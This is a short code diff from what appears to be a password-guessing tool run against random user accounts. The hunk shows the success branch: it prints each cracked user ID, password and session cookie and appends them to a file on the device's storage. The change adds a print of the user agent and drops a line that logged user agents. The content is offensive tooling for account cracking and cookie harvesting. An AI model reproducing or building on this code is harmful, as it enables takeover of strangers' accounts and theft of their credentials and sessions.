@@ -1370,8 +1370,8 @@ def rndmx(ids,pasx,tl):
                                 if 'live' in reqx:
                                         print(f'\r\r{G}[ATOM-OK]: {uid} | {pas}')
                                         print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+                                        print(f"\r\033[38;5;196mCOOKIES=[🤖]: {user_agent}\33[1;36m")
                                         open('/sdcard/PAISAOK-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
-                                        open('/sdcard/UGEN.txt','a').write(user_agent+'\n')
                                         ok.append(str(uid))
                                         break
                                 if 'lock' in reqx:
